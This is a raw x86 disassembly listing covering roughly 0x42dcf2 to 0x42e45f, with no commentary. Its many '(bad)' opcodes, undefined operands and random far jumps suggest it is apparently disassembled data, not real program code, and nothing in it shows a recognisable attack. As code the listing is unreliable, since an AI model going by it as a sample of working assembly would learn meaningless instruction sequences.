  42dcf2:	sbb    bh,bl
  42dcf4:	retf   0xbc93
  42dcf7:	xchg   edi,eax
  42dcf8:	dec    ebx
  42dcf9:	mov    ah,0x11
  42dcfb:	call   0x242a8943
  42dd00:	adc    eax,DWORD PTR ss:[ebx]
  42dd03:	pop    ss
  42dd04:	or     ecx,DWORD PTR [esi]
  42dd06:	enter  0x12,0x0
  42dd0a:	add    BYTE PTR [eax],al
  42dd0c:	add    BYTE PTR [eax],al
  42dd0e:	nop
  42dd0f:	cdq    
  42dd10:	jmp    0x78d1743f
  42dd15:	(bad)  
  42dd16:	aas    
  42dd17:	sbb    bl,BYTE PTR [ebp+0x3cc9913d]
  42dd1d:	add    cl,dl
  42dd1f:	xor    ch,BYTE PTR [eax-0x76]
  42dd22:	rcr    BYTE PTR [ecx],1
  42dd24:	mov    eax,0xcf3d1f31
  42dd29:	xchg   ah,al
  42dd2b:	lods   eax,DWORD PTR ds:[esi]
  42dd2c:	push   es
  42dd2d:	test   al,dl
  42dd2f:	cld    
  42dd30:	xchg   ebx,eax
  42dd31:	hlt    
  42dd32:	nop
  42dd33:	sbb    DWORD PTR [eax],edx
  42dd35:	cs loop 0x42dcc9
  42dd38:	inc    ebx
  42dd39:	and    al,0xa2
  42dd3b:	xor    bl,BYTE PTR [ecx-0x6ce61001]
  42dd41:	clc    
  42dd42:	mov    ?,ebx
  42dd44:	repnz dec ebp
  42dd46:	push   0x13
  42dd48:	dec    edx
  42dd49:	mov    ecx,0x4f6518
  42dd4e:	mov    eax,0xcac0e1b2
  42dd53:	add    esi,DWORD PTR [edx-0x3d]
  42dd56:	inc    ebx
  42dd57:	mov    edx,0x5f080287
  42dd5c:	adc    DWORD PTR [esi],edx
  42dd5e:	mov    bh,0x8c
  42dd60:	pusha  
  42dd61:	dec    edi
  42dd62:	ins    BYTE PTR es:[edi],dx
  42dd63:	stos   BYTE PTR es:[edi],al
  42dd64:	jp     0x42ddba
  42dd66:	xchg   ecx,eax
  42dd67:	scas   eax,DWORD PTR es:[edi]
  42dd68:	or     al,0xf5
  42dd6a:	xlat   BYTE PTR ds:[ebx]
  42dd6b:	cmp    dh,BYTE PTR [edx+0x4bb39ee7]
  42dd71:	ret    
  42dd72:	add    BYTE PTR [eax],al
  42dd74:	add    BYTE PTR [eax],al
  42dd76:	add    BYTE PTR [eax],bl
  42dd78:	outs   dx,BYTE PTR ds:[esi]
  42dd79:	rcr    DWORD PTR [edi],1
  42dd7b:	push   ss
  42dd7c:	xor    ch,BYTE PTR [edx]
  42dd7e:	nop
  42dd7f:	mov    bh,0xb2
  42dd81:	int3   
  42dd82:	jns    0x42ddb3
  42dd84:	(bad)  
  42dd85:	sbb    eax,0xba377f39
  42dd8a:	out    0x7b,eax
  42dd8c:	pusha  
  42dd8d:	jo     0x42dd9e
  42dd8f:	add    eax,0x904793aa
  42dd94:	aaa    
  42dd95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dd96:	lods   al,BYTE PTR ds:[esi]
  42dd97:	dec    ebp
  42dd98:	add    al,0xcd
  42dd9a:	mov    edi,0x1d4af213
  42dd9f:	pcmpeqd mm2,QWORD PTR [ecx]
  42dda2:	sbb    al,0x16
  42dda4:	outs   dx,BYTE PTR ds:[esi]
  42dda5:	sbb    DWORD PTR [ebx],edx
  42dda7:	sub    dh,dl
  42dda9:	pop    ebp
  42ddaa:	dec    eax
  42ddab:	je     0x42dd4c
  42ddad:	loope  0x42ddbe
  42ddaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ddb0:	pushf  
  42ddb1:	dec    edx
  42ddb2:	push   ebx
  42ddb3:	xchg   ecx,eax
  42ddb4:	scas   eax,DWORD PTR es:[edi]
  42ddb5:	lods   al,BYTE PTR ds:[esi]
  42ddb6:	stos   DWORD PTR es:[edi],eax
  42ddb7:	dec    ebx
  42ddb8:	mov    bl,0x43
  42ddba:	dec    eax
  42ddbb:	mov    ah,0x9f
  42ddbd:	outs   dx,DWORD PTR ds:[esi]
  42ddbe:	test   bh,cl
  42ddc0:	xor    dh,BYTE PTR [esi]
  42ddc2:	add    al,0x18
  42ddc4:	scas   al,BYTE PTR es:[edi]
  42ddc5:	repz inc ebp
  42ddc7:	push   cs
  42ddc8:	pop    esi
  42ddc9:	rcl    DWORD PTR [ecx],1
  42ddcb:	pop    ss
  42ddcc:	jbe    0x42dddc
  42ddce:	int    0x7f
  42ddd0:	outs   dx,DWORD PTR ds:[esi]
  42ddd1:	daa    
  42ddd2:	jo     0x42dd73
  42ddd4:	test   cl,ch
  42ddd6:	addr16 pop es
  42ddd8:	or     BYTE PTR [eax],bh
  42ddda:	push   esi
  42dddb:	add    BYTE PTR [eax],al
  42dddd:	add    BYTE PTR [eax],al
  42dddf:	add    BYTE PTR [ebx+0x56fd327e],dl
  42dde5:	sub    edx,ebp
  42dde7:	scas   eax,DWORD PTR es:[edi]
  42dde8:	xor    BYTE PTR [ebx-0x71],bl
  42ddeb:	sub    eax,0x4c92437c
  42ddf0:	pop    ecx
  42ddf1:	jecxz  0x42dd85
  42ddf3:	sbb    ebx,DWORD PTR [ecx-0x19]
  42ddf6:	sub    bl,ah
  42ddf8:	(bad)  
  42ddf9:	jmp    0xe602d128
  42ddfe:	sub    dh,al
  42de00:	(bad)  
  42de01:	icebp  
  42de02:	sub    cl,bh
  42de04:	mov    eax,0x77a597d9
  42de09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42de0a:	aaa    
  42de0b:	adc    ecx,DWORD PTR cs:[edx]
  42de0e:	adc    dh,BYTE PTR [edi+0x73]
  42de11:	cwde   
  42de12:	adc    DWORD PTR [ebx+edx*8-0x4d],esp
  42de16:	jbe    0x42de41
  42de18:	pop    ds
  42de19:	ret    0xea0e
  42de1c:	dec    esi
  42de1d:	jb     0x42de0a
  42de1f:	hlt    
  42de20:	sbb    esi,DWORD PTR [ecx+0x4208e94e]
  42de26:	(bad)  
  42de27:	loopne 0x42de7e
  42de29:	mov    dh,0xc
  42de2b:	or     DWORD PTR [ebx],edx
  42de2d:	cmc    
  42de2e:	adc    edx,edx
  42de30:	cli    
  42de31:	aaa    
  42de32:	adc    edx,esi
  42de34:	jmp    0xf7af:0xf8159930
  42de3b:	sbb    BYTE PTR [ecx+esi*2+0x41],0x37
  42de40:	or     ebx,DWORD PTR [eax]
  42de42:	cwde   
  42de43:	test   al,0x0
  42de45:	add    BYTE PTR [eax],al
  42de47:	add    BYTE PTR [eax],al
  42de49:	add    ch,cl
  42de4b:	pop    ds
  42de4c:	xchg   edi,eax
  42de4d:	inc    esi
  42de4e:	cmp    DWORD PTR [ebx+0x0],ebp
  42de51:	aad    0x9d
  42de53:	xchg   ebp,eax
  42de54:	inc    esp
  42de55:	aad    0xa5
  42de57:	xchg   ecx,eax
  42de58:	in     eax,dx
  42de59:	aad    0x5a
  42de5b:	xchg   esp,eax
  42de5c:	or     al,0xba
  42de5e:	xor    eax,0xb7e420e7
  42de63:	rol    BYTE PTR [edi+ebx*4],1
  42de66:	or     eax,0x3e2941f5
  42de6b:	cmp    al,0x73
  42de6d:	mov    bl,0x35
  42de6f:	out    0x2d,eax
  42de71:	in     eax,0xaa
  42de73:	mov    ?,ecx
  42de75:	(bad)  
  42de76:	mov    ebx,0x76608003
  42de7b:	jnp    0x42de82
  42de7d:	stc    
  42de7e:	ds daa 
  42de80:	ja     0x42de0a
  42de82:	and    cl,BYTE PTR [edi-0x5b]
  42de85:	pop    ebp
  42de86:	stos   BYTE PTR es:[edi],al
  42de87:	pop    edi
  42de88:	add    eax,0x75493ee9
  42de8d:	je     0x42dec4
  42de8f:	out    0x7a,eax
  42de91:	out    0xa5,eax
  42de93:	rol    BYTE PTR [edi+ebx*1],1
  42de96:	or     cl,BYTE PTR [esi-0x73]
  42de99:	xor    eax,0x3873f3ff
  42de9e:	aas    
  42de9f:	jmp    0x96f640ea
  42dea4:	or     al,0x9f
  42dea6:	sub    edx,DWORD PTR [eax+0x24]
  42dea9:	cmp    DWORD PTR [edx+0x50],esi
  42deac:	cmp    eax,DWORD PTR [eax]
  42deae:	add    BYTE PTR [eax],al
  42deb0:	add    BYTE PTR [eax],al
  42deb2:	cld    
  42deb3:	ret    
  42deb4:	mov    bl,0xc6
  42deb6:	xor    eax,0xa25eebff
  42debb:	clc    
  42debc:	inc    ebp
  42debd:	pop    ebp
  42debe:	sbb    BYTE PTR [ebp-0x54],0x4
  42dec2:	stc    
  42dec3:	popa   
  42dec4:	inc    eax
  42dec5:	push   edi
  42dec6:	sbb    ch,0x94
  42dec9:	cli    
  42deca:	sub    bh,0x74
  42decd:	leave  
  42dece:	nop
  42decf:	or     al,0x51
  42ded1:	je     0x42de5c
  42ded3:	xor    ebx,DWORD PTR [ebx-0x24]
  42ded6:	out    0x37,eax
  42ded8:	xchg   esi,eax
  42ded9:	out    dx,eax
  42deda:	adc    eax,0x3e0a2689
  42dedf:	xchg   esp,eax
  42dee0:	rol    DWORD PTR [esi-0x4cccd25],0xc7
  42dee7:	xchg   edi,eax
  42dee8:	xchg   ebp,eax
  42dee9:	shr    DWORD PTR [ebx+0x57bfdf0c],0x49
  42def0:	inc    edi
  42def1:	mov    edi,0x869f9446
  42def6:	push   esi
  42def7:	cmp    edx,ebx
  42def9:	add    DWORD PTR [eax+0xd00528f],esi
  42deff:	shl    BYTE PTR [esi],cl
  42df01:	add    eax,0xfb476c78
  42df06:	xchg   DWORD PTR [ebp+0x767be7dc],eax
  42df0c:	test   eax,0xf44e7efa
  42df11:	pop    es
  42df12:	xchg   ecx,eax
  42df13:	and    eax,0x8713
  42df18:	add    BYTE PTR [eax],al
  42df1a:	add    BYTE PTR [esi-0x5e],dl
  42df1d:	cld    
  42df1e:	fistp  DWORD PTR [edi+0x1]
  42df21:	xchg   edi,eax
  42df22:	shl    DWORD PTR [esi-0x1affe935],0x94
  42df29:	sahf   
  42df2a:	dec    esi
  42df2b:	faddp  st(0),st
  42df2d:	test   eax,0xc8849874
  42df32:	cli    
  42df33:	mov    ebp,0x2fc8defd
  42df38:	addr16 add bh,bl
  42df3b:	popf   
  42df3c:	add    eax,0x9b8874ab
  42df41:	(bad)  
  42df43:	sub    BYTE PTR ds:0x94900010,bl
  42df49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42df4a:	test   BYTE PTR [edi],al
  42df4c:	mov    bl,0xe4
  42df4e:	xchg   DWORD PTR [esi-0x4e],edi
  42df51:	cmc    
  42df52:	add    esp,DWORD PTR [edi-0x5104e40e]
  42df58:	rol    BYTE PTR [ecx],cl
  42df5a:	rep ins DWORD PTR es:[edi],dx
  42df5c:	mov    ds:0x76628f05,al
  42df61:	add    edi,DWORD PTR [ebp+0x43cb927c]
  42df67:	nop
  42df68:	xor    esi,DWORD PTR [edx-0x324bd1f1]
  42df6e:	and    eax,0x88d3b909
  42df73:	jbe    0x42df47
  42df75:	hlt    
  42df76:	jne    0x42dfce
  42df78:	rcl    ebx,1
  42df7a:	ret    0xaac7
  42df7d:	fisttp DWORD PTR [eax]
  42df7f:	add    BYTE PTR [eax],al
  42df81:	add    BYTE PTR [eax],al
  42df83:	add    al,cl
  42df85:	cwde   
  42df86:	pop    esi
  42df87:	dec    esp
  42df88:	push   edx
  42df89:	sub    edi,DWORD PTR [ecx-0x5288e6e1]
  42df8f:	lock inc edi
  42df91:	cwde   
  42df92:	out    dx,al
  42df93:	inc    eax
  42df94:	les    eax,FWORD PTR [esi+0x629429b1]
  42df9a:	jb     0x42dfd0
  42df9c:	les    ebp,FWORD PTR [eax+0x1c]
  42df9f:	push   ss
  42dfa0:	lock test al,0xb5
  42dfa3:	add    ebx,edi
  42dfa5:	idiv   cl
  42dfa7:	sub    DWORD PTR [ebx-0x6e7564a6],eax
  42dfad:	cwde   
  42dfae:	jo     0x42dff0
  42dfb0:	jl     0x42df61
  42dfb2:	mov    ecx,DWORD PTR [edi-0x7b]
  42dfb5:	xor    edx,DWORD PTR [ebp+0x5c]
  42dfb8:	nop
  42dfb9:	cwde   
  42dfba:	mov    dh,0xa4
  42dfbc:	xchg   edi,eax
  42dfbd:	cwde   
  42dfbe:	lock retf 
  42dfc0:	lods   eax,DWORD PTR ds:[esi]
  42dfc1:	mov    ds:0x62744762,al
  42dfc6:	jp     0x42e00b
  42dfc8:	mov    ah,0x62
  42dfca:	push   cs
  42dfcb:	dec    edi
  42dfcc:	sbb    eax,0xa1ae446c
  42dfd1:	pop    esi
  42dfd2:	add    al,0x29
  42dfd4:	xchg   esp,eax
  42dfd5:	jg     0x42dfa9
  42dfd7:	in     eax,dx
  42dfd8:	push   cs
  42dfd9:	xchg   esp,eax
  42dfda:	jp     0x42dfc5
  42dfdc:	push   ds
  42dfdd:	hlt    
  42dfde:	dec    ebx
  42dfdf:	das    
  42dfe0:	inc    edi
  42dfe1:	pop    ebp
  42dfe2:	rcr    ch,1
  42dfe4:	xchg   ebx,eax
  42dfe5:	gs xchg edi,eax
  42dfe7:	lea    eax,[eax]
  42dfe9:	add    BYTE PTR [eax],al
  42dfeb:	add    BYTE PTR [eax],al
  42dfed:	cmp    eax,0x16e8a3ab
  42dff2:	pop    es
  42dff3:	adc    esp,esi
  42dff5:	xchg   ecx,eax
  42dff6:	aaa    
  42dff7:	into   
  42dff8:	sbb    cl,ch
  42dffa:	pop    ss
  42dffb:	sbb    al,0x6a
  42dffd:	hlt    
  42dffe:	mov    ds:0x3ea6ed61,eax
  42e003:	clc    
  42e004:	out    0x16,eax
  42e006:	jbe    0x42e00a
  42e008:	jb     0x42e053
  42e00a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e00b:	js     0x42dff6
  42e00d:	fiadd  DWORD PTR [ebp-0x5d3ec9fe]
  42e013:	js     0x42dffe
  42e015:	dec    edx
  42e016:	xchg   DWORD PTR [esi],edx
  42e018:	mov    ebx,0x3197e30e
  42e01d:	and    al,0xb7
  42e01f:	push   cs
  42e020:	jmp    0x2b8c3bb8
  42e025:	xor    BYTE PTR [edx-0x4c7fea73],0xe
  42e02c:	jmp    0x378747ef
  42e031:	jo     0x42dfea
  42e033:	push   cs
  42e034:	jmp    0xd860c1b
  42e039:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e03a:	sub    ebx,DWORD PTR [ebx+0x5]
  42e03d:	mov    al,ds:0x2c0da2bb
  42e042:	mov    bl,0xe
  42e044:	jmp    0xc511e3
  42e049:	sub    DWORD PTR [edx-0x417b74f2],esi
  42e04f:	sbb    al,0x40
  42e051:	add    BYTE PTR [eax],al
  42e053:	add    BYTE PTR [eax],al
  42e055:	add    cl,bh
  42e057:	iret   
  42e058:	bound  esi,QWORD PTR [ebx]
  42e05a:	and    ah,BYTE PTR [ebp-0x19]
  42e05d:	xor    eax,0x5034e1
  42e062:	push   ss
  42e063:	jecxz  0x42dff9
  42e065:	clc    
  42e066:	jl     0x42e0a0
  42e068:	pusha  
  42e069:	sbb    al,0x72
  42e06b:	call   0x388d3f63
  42e070:	jmp    0x113409a8
  42e075:	loopne 0x42e0ad
  42e077:	jno    0x42e087
  42e079:	data16 xor BYTE PTR [eax+0x52],dh
  42e07d:	inc    ax
  42e07f:	jo     0x42e0c3
  42e081:	mov    esi,esi
  42e083:	shl    ebx,0x2
  42e086:	xor    bh,BYTE PTR [ebx+edx*4]
  42e089:	(bad)  
  42e08a:	mov    ebp,0x8d9c265f
  42e08f:	cli    
  42e090:	push   cs
  42e091:	add    BYTE PTR [ecx-0x4e978e33],ch
  42e097:	mov    cl,0xe
  42e099:	add    BYTE PTR [edx],ch
  42e09b:	cmp    BYTE PTR [ebx],ah
  42e09d:	sub    dl,ch
  42e09f:	mov    ebp,0x2cbcff0e
  42e0a4:	cld    
  42e0a5:	test   DWORD PTR [edi-0x7874fe33],ecx
  42e0ab:	dec    ecx
  42e0ac:	or     DWORD PTR [ebx-0x3fc2c76a],esp
  42e0b2:	scas   al,BYTE PTR es:[edi]
  42e0b3:	mov    bl,0x76
  42e0b5:	mov    bh,cl
  42e0b7:	mov    al,0x70
  42e0b9:	mov    DWORD PTR [eax],eax
  42e0bb:	add    BYTE PTR [eax],al
  42e0bd:	add    BYTE PTR [eax],al
  42e0bf:	out    dx,eax
  42e0c0:	push   0x47c202f3
  42e0c5:	xchg   edi,eax
  42e0c6:	ja     0x42e0a1
  42e0c8:	jge    0x42e0a7
  42e0ca:	je     0x42e05c
  42e0cc:	cld    
  42e0cd:	call   0x1ffa:0x716138ca
  42e0d4:	(bad)  
  42e0d5:	shl    BYTE PTR [ebx-0x7c],cl
  42e0d8:	adc    BYTE PTR [ebp+0x70],0xf8
  42e0dc:	je     0x42e14f
  42e0de:	cli    
  42e0df:	pop    es
  42e0e0:	xchg   edi,eax
  42e0e1:	shl    BYTE PTR [edi+eiz*4-0x80],cl
  42e0e5:	or     eax,0xd5809166
  42e0ea:	cli    
  42e0eb:	sbb    al,0xcf
  42e0ee:	pop    edx
  42e0ef:	inc    esi
  42e0f0:	into   
  42e0f1:	dec    ecx
  42e0f2:	adc    esp,0x900010de
  42e0f8:	dec    ecx
  42e0f9:	or     eax,DWORD PTR [eax]
  42e0fb:	push   cs
  42e0fc:	scas   eax,DWORD PTR es:[edi]
  42e0fd:	jmp    0x42e0fe
  42e0ff:	(bad)  
  42e100:	(bad)  
  42e101:	xchg   esi,eax
  42e102:	and    edi,DWORD PTR [eax+0xa]
  42e105:	adc    BYTE PTR [eax],al
  42e107:	cli    
  42e108:	mov    edx,0xa090000f
  42e10d:	fdiv   QWORD PTR [ebx+0x65]
  42e110:	mov    al,ds:0x865973d8
  42e115:	pop    edi
  42e117:	nop
  42e118:	or     edx,DWORD PTR [eax]
  42e11a:	or     eax,DWORD PTR [edi-0x5e]
  42e11d:	cdq    
  42e11e:	mov    esi,0x723cfcb
  42e123:	add    BYTE PTR [eax],al
  42e125:	add    BYTE PTR [eax],al
  42e127:	add    dh,dh
  42e129:	adc    dl,cl
  42e12b:	or     dl,dl
  42e12d:	mov    ecx,0xb152b315
  42e132:	pop    ss
  42e133:	bound  ebp,QWORD PTR [ebx+0x603e15cb]
  42e139:	add    eax,0xcaaac15f
  42e13e:	loope  0x42e108
  42e140:	lahf   
  42e141:	mov    ebx,0x6e3840c2
  42e146:	test   edx,edi
  42e148:	aas    
  42e149:	mov    bl,0x60
  42e14b:	xchg   DWORD PTR [ebx-0x46],esi
  42e14e:	test   BYTE PTR [ebx],0x90
  42e151:	sub    BYTE PTR [esi+0x53efe208],bl
  42e157:	add    eax,0x5b018951
  42e15c:	mov    dl,0xaf
  42e15e:	mov    dh,0x8
  42e160:	inc    ebx
  42e161:	jmp    0x42e1be
  42e163:	mov    edx,DWORD PTR [edx-0x5a]
  42e166:	int    0xac
  42e168:	fdivr  st,st(3)
  42e16a:	mov    ah,0x8a
  42e16c:	push   edx
  42e16d:	mov    ds:0x369ac372,al
  42e172:	or     bh,BYTE PTR [ecx+0x3f70fbea]
  42e178:	mov    ah,0xa6
  42e17a:	jp     0x42e13f
  42e17c:	arpl   WORD PTR [edx+0x2d6013ff],sp
  42e182:	cmp    eax,0xc2fb6040
  42e187:	push   edi
  42e188:	mov    ds:0x84f572,al
  42e18d:	add    BYTE PTR [eax],al
  42e18f:	add    BYTE PTR [eax],al
  42e191:	shr    DWORD PTR [esi-0x5d8bc0a0],cl
  42e197:	jp     0x42e15c
  42e199:	and    esp,DWORD PTR [edx+0x2d4017cf]
  42e19f:	mov    ebp,0xc2fb404f
  42e1a4:	push   edi
  42e1a5:	mov    ds:0x5384f572,al
  42e1aa:	scas   al,BYTE PTR es:[edi]
  42e1ab:	outs   dx,DWORD PTR ds:[esi]
  42e1ac:	jg     0x42e161
  42e1ae:	retf   0x3f6
  42e1b1:	nop
  42e1b2:	sti    
  42e1b3:	inc    ecx
  42e1b4:	fistp  QWORD PTR [ebx+0x1503f5b1]
  42e1ba:	mov    esp,ebx
  42e1bc:	mov    eax,0x2c1d623
  42e1c1:	nop
  42e1c2:	mov    dl,0x5f
  42e1c4:	aam    0x16
  42e1c6:	in     eax,dx
  42e1c7:	push   cs
  42e1c8:	lds    edi,FWORD PTR ds:0x27010b86
  42e1ce:	sbb    al,0xec
  42e1d0:	out    0x8f,al
  42e1d2:	inc    eax
  42e1d3:	fwait
  42e1d4:	add    eax,0xe90eb224
  42e1d9:	and    ch,ch
  42e1db:	mov    cs,WORD PTR [ebp-0x16f234d0]
  42e1e1:	xchg   ebx,eax
  42e1e2:	mov    dh,0x1b
  42e1e4:	fidiv  DWORD PTR es:[edx]
  42e1e7:	pop    edx
  42e1e8:	call   0x2d399827
  42e1ed:	jae    0x42e1e7
  42e1ef:	jmp    0x42e263
  42e1f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e1f2:	mov    ds:0xcd78,al
  42e1f7:	add    BYTE PTR [eax],al
  42e1f9:	add    BYTE PTR [eax+0x60],al
  42e1fc:	jmp    0x42e1fa
  42e1fe:	aas    
  42e1ff:	mov    al,ds:0x470ae94e
  42e204:	xor    ebp,DWORD PTR ds:0x140eb28d
  42e20a:	pop    es
  42e20b:	aas    
  42e20c:	xor    ebp,DWORD PTR ds:0x6a0eb28d
  42e212:	inc    dh
  42e214:	inc    esp
  42e215:	mov    ax,ds:0x93a9045e
  42e21b:	jnp    0x42e1ef
  42e21d:	std    
  42e21e:	mov    es,WORD PTR [eax-0x40]
  42e221:	ret    
  42e222:	xchg   esp,eax
  42e223:	sub    eax,0x6e4171b
  42e228:	lea    edi,[esi]
  42e22a:	inc    edi
  42e22b:	lods   eax,DWORD PTR ds:[esi]
  42e22c:	mov    ds:0x52f597ae,eax
  42e231:	add    eax,0xe90eae9c
  42e236:	xchg   ebx,eax
  42e237:	das    
  42e238:	iret   
  42e239:	xchg   ebp,eax
  42e23a:	cwde   
  42e23b:	(bad)  
  42e23c:	jmp    0x42e1dc
  42e23e:	and    DWORD PTR [edi],0x5b
  42e241:	lds    esi,FWORD PTR [ebx+0x12]
  42e244:	mov    esi,0xe941c200
  42e249:	mov    esi,DWORD PTR [esi+0x47]
  42e24c:	mov    esp,0x19413efe
  42e251:	mov    dh,0xf5
  42e253:	(bad)  [edi]
  42e255:	dec    eax
  42e256:	aad    0xb0
  42e258:	push   esi
  42e259:	jne    0x42e280
  42e25b:	sub    ecx,DWORD PTR [edi+0x54]
  42e25e:	add    BYTE PTR [eax],al
  42e260:	add    BYTE PTR [eax],al
  42e262:	add    bh,dl
  42e264:	xor    eax,0xadc41724
  42e269:	repz or ebx,DWORD PTR [esi+ebp*2-0x28599ae]
  42e271:	jmp    0xac47dde9
  42e276:	ret    0xb5f5
  42e279:	inc    ecx
  42e27a:	mov    ebx,DWORD PTR ds:0x7114f835
  42e280:	and    eax,0x64f9446a
  42e285:	inc    eax
  42e286:	push   0xffffffda
  42e288:	sub    al,0xc7
  42e28a:	pop    edx
  42e28b:	imul   edx,DWORD PTR ds:0xa6798de6,0xcd467554
  42e295:	data16 xor BYTE PTR [ebp-0x52],0xe7
  42e29a:	adc    eax,0x4ea325
  42e29f:	ret    
  42e2a0:	mov    ch,0x76
  42e2a2:	add    BYTE PTR [ecx-0x5695f153],bh
  42e2a8:	inc    eax
  42e2a9:	add    ecx,DWORD PTR [ebx+edi*4-0x5e5cf18b]
  42e2b0:	xor    eax,0xf5f40050
  42e2b5:	bound  edx,QWORD PTR [esi+ebp*4]
  42e2b8:	mov    ds:0xb529117e,al
  42e2bd:	mov    ebp,DWORD PTR [eax]
  42e2bf:	cli    
  42e2c0:	mov    ecx,0x690c60e
  42e2c5:	or     ch,BYTE PTR [edi+0x0]
  42e2c8:	add    BYTE PTR [eax],al
  42e2ca:	add    BYTE PTR [eax],al
  42e2cc:	aam    0xb
  42e2ce:	adc    bh,ah
  42e2d0:	(bad)
  42e2d4:	ret    
  42e2d5:	dec    edi
  42e2d6:	adc    BYTE PTR [ecx],al
  42e2d8:	mov    edx,0xe00035eb
  42e2dd:	or     BYTE PTR [eax+edi*2],bl
  42e2e0:	mov    ds:0x208712cb,al
  42e2e5:	mov    ?,WORD PTR [ebx+esi*2+0x14a1b994]
  42e2ec:	adc    al,0xfd
  42e2ee:	dec    edi
  42e2ef:	add    BYTE PTR [ecx],cl
  42e2f1:	ror    DWORD PTR [edx],1
  42e2f3:	out    0x92,eax
  42e2f5:	cld    
  42e2f6:	mov    ecx,0x366bbd88
  42e2fb:	inc    esp
  42e2fc:	nop
  42e2fd:	mov    ?,WORD PTR [ebx+esi*2-0x13a48146]
  42e304:	sub    DWORD PTR [esi],esp
  42e306:	adc    eax,DWORD PTR [eax]
  42e308:	nop
  42e309:	xor    ecx,DWORD PTR [ebx]
  42e30b:	add    al,0x90
  42e30d:	or     edx,DWORD PTR [ebp-0x5e661bb4]
  42e313:	adc    al,0x10
  42e315:	fisttp QWORD PTR [edi+0x0]
  42e318:	sbb    ecx,ecx
  42e31a:	push   es
  42e31b:	test   eax,edx
  42e31d:	(bad)  
  42e31e:	jmp    0x42e2cf
  42e320:	xchg   ecx,eax
  42e321:	or     BYTE PTR fs:[edi+0x4433eb65],al
  42e328:	nop
  42e329:	xchg   BYTE PTR [ebx+esi*2+0x14a3418e],bh
  42e330:	add    BYTE PTR [eax],al
  42e332:	add    BYTE PTR [eax],al
  42e334:	add    ah,ch
  42e336:	fmul   QWORD PTR [edi+0x0]
  42e339:	sbb    ecx,eax
  42e33b:	mov    edx,0xa1c16848
  42e340:	sub    eax,0xc9472850
  42e345:	push   ebx
  42e346:	mov    bl,0xa8
  42e348:	dec    ebp
  42e349:	ret    
  42e34a:	ret    
  42e34b:	add    esi,DWORD PTR [ebp+0x6f]
  42e34e:	sub    BYTE PTR [esi+0x65b66803],dh
  42e354:	mov    ch,0x5a
  42e356:	das    
  42e357:	xor    BYTE PTR ss:[edi-0x74],bh
  42e35b:	test   BYTE PTR [eax-0x53d13b9e],0x75
  42e362:	sub    ch,bh
  42e364:	mov    ah,0xe
  42e366:	fstp   TBYTE PTR [edx-0x28]
  42e369:	stos   BYTE PTR es:[edi],al
  42e36a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e36b:	mov    ebp,0xc4f80046
  42e370:	jle    0x42e3b8
  42e372:	test   al,0x61
  42e374:	ret    
  42e375:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  42e377:	mov    ebp,0xacf82051
  42e37c:	jg     0x42e3c5
  42e37e:	jle    0x42e37c
  42e380:	stos   DWORD PTR es:[edi],eax
  42e381:	(bad)  
  42e382:	and    bh,BYTE PTR [ebp+0x45b0eeb4]
  42e388:	add    dl,BYTE PTR [ebx+esi*8]
  42e38b:	add    cl,BYTE PTR [ebx]
  42e38d:	push   edx
  42e38e:	xor    edi,DWORD PTR [ebp-0x807a101]
  42e394:	xor    DWORD PTR [edi],ebx
  42e396:	pop    eax
  42e397:	js     0x42e34e
  42e399:	add    BYTE PTR [eax],al
  42e39b:	add    BYTE PTR [eax],al
  42e39d:	add    ch,cl
  42e39f:	push   ebp
  42e3a0:	xor    BYTE PTR [eax],dh
  42e3a2:	jp     0x42e3ae
  42e3a4:	data16 test BYTE PTR [edx+0x43c371f7],bh
  42e3ab:	int    0xbf
  42e3ad:	add    esi,DWORD PTR [esi]
  42e3af:	mov    cl,0xaf
  42e3b1:	lahf   
  42e3b2:	sbb    dh,BYTE PTR [ebx-0xb]
  42e3b5:	lock enter 0x90a,0x94
  42e3ba:	call   0x3da7:0x3c379f7
  42e3c1:	add    eax,0x360ef720
  42e3c6:	push   DWORD PTR [edi]
  42e3c8:	arpl   dx,bp
  42e3ca:	add    esi,DWORD PTR [ebx+0x2c2211cf]
  42e3d0:	in     al,dx
  42e3d1:	push   ds
  42e3d2:	popa   
  42e3d3:	aaa    
  42e3d4:	shr    BYTE PTR [edx+0x37],1
  42e3d7:	retf   
  42e3d8:	aas    
  42e3d9:	mov    ah,0xc5
  42e3db:	arpl   WORD PTR [edi+0x1fbde10],dx
  42e3e1:	stc    
  42e3e2:	mov    al,ds:0xab480e72
  42e3e7:	mov    edx,DWORD PTR [edx-0x17]
  42e3ea:	push   cs
  42e3eb:	imul   esi,DWORD PTR [edx],0x1
  42e3ee:	(bad)
  42e3f1:	cmp    DWORD PTR [ebp-0x62fecd7d],esp
  42e3f7:	jae    0x42e42b
  42e3f9:	in     eax,dx
  42e3fa:	loop   0x42e399
  42e3fc:	call   0xa1:0x97b253dc
  42e403:	add    BYTE PTR [eax],al
  42e405:	add    BYTE PTR [eax],al
  42e407:	sbb    eax,esp
  42e409:	bound  eax,QWORD PTR [eax+0x7f]
  42e40c:	lock idiv BYTE PTR ds:0x72ebfbdb
  42e413:	cmp    al,0x2e
  42e415:	in     al,dx
  42e416:	adc    eax,0x3f3f6340
  42e41b:	and    eax,DWORD PTR [ebx-0x61dd36ce]
  42e421:	sbb    ah,0x53
  42e424:	mov    dl,0x8f
  42e426:	or     DWORD PTR [ebp-0x2c9dea82],0x396730e
  42e430:	cld    
  42e431:	imul   DWORD PTR [eax-0x5265fbd2]
  42e437:	scas   eax,DWORD PTR es:[edi]
  42e438:	call   0xad95:0x9ab7dd95
  42e43f:	scas   eax,DWORD PTR es:[edi]
  42e440:	xchg   esi,eax
  42e441:	test   BYTE PTR [eax],0x25
  42e444:	imul   al
  42e446:	jmp    DWORD PTR [ebx-0x5b]
  42e449:	cdq    
  42e44a:	push   esp
  42e44b:	(bad)  
  42e44c:	(bad)  
  42e44d:	inc    esi
  42e44e:	call   0x51911f
  42e453:	in     al,0x6a
  42e455:	xor    ah,BYTE PTR [ecx+ebp*1]
  42e458:	inc    ecx
  42e459:	add    eax,DWORD PTR [eax-0x7af18da5]
  42e45f:	test   eax,0xa98b15ba
